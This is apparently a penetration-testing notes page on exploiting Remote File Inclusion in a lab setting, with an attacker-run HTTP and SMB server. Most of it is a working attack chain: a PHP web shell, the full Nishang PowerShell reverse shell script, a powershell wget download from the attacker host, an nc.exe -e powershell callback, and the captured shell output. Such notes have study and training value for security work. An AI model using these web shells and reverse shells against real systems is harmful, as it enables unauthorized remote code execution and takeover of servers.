# Remote File Inclusion

is similiar to LFI, but we can connect with our machine through it.

## HTTP Server


```
python3 -m http.server 80
```

On the RFI vulnerable domain:

```
http://192.168.156.58/image.php?img=http://192.168.45.206/test.txt
```


## SMB Server Connection

Let's create an local smb server on kali linux, which we can then parse in the URL and connect to/execute files on it.

Configuring config smb server [profiles] 

```
nano /etc/samba/smb.conf
[htb]
   comment = Users profiles
   path = /srv/smb
   guest ok = yes
   browseable = yes
   create mask = 0600
   directory mask = 0700
```

Ur smb server is now named "htb".

Start it up.

```
systemctl start smbd
```

To test if RFI is possible, create an test.txt file inside the share path.
Start an listener

```
nc -lvnp 445
```

Request the file from the smb server in the RFI URL

```
curl http://10.129.229.6/blog/?lang=\\10.10.14.239\htb\test.txt
```

## Command Execution in RFI

Create shell.php file with following content in /srv/smb:

```
<?php system($_REQUEST['cmd']); ?>
```

Request the shell.php with an command of ur choice.

```
curl http://10.129.229.6/blog/?lang=\\10.10.14.239\htb\shell.php&cmd=whoami
```

## RCE using RFI

Use the following revshell ps script

```
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.239 -Port 1337
```

launch python server where u saved the revshell script.

```
python3 -m http.server 80
```

Request the ps script.

```
curl http://10.129.229.6/blog/?lang=\\10.10.14.239\htb\shell.php&cmd=powershell+wget+"http%3a//10.10.14.239/Invoke-PowerShellTcp.ps1"
```

Start up listener on 1337

```
nc -lvnp 1337
```

Soo now that we have an uploaded revshell file onto the target system, let's execute it with netcat.

We will have to put the netcat windows binary inside the smb share for this to work.

```
curl http://10.129.229.6/blog/?lang=\\10.10.14.239\htb\shell.php&cmd=\\10.10.14.239\htb\nc.exe+10.10.14.239+1337+-e+powershell
```

Gained RCE as user

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.239] from (UNKNOWN) [10.129.229.6] 49862
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog>
```
